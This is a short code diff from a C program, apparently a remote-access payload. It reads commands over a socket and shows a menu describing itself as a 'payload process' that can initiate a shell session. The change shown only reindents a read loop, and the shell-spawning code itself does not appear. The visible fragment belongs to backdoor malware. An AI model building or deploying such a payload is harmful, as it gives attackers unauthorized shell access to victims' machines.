@@ -29,7 +29,7 @@ int main(void){
   write(sockt, hello, strlen(hello));
   
   while (connection_established == 0){
-      while((n = read(sockt, buffer, MAXBUF)) > 0){
+  while((n = read(sockt, buffer, MAXBUF)) > 0){
   if(strncmp(buffer, "help\n", 5) == 0){
 	  char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\nexit - exits payload process\n\n";
 
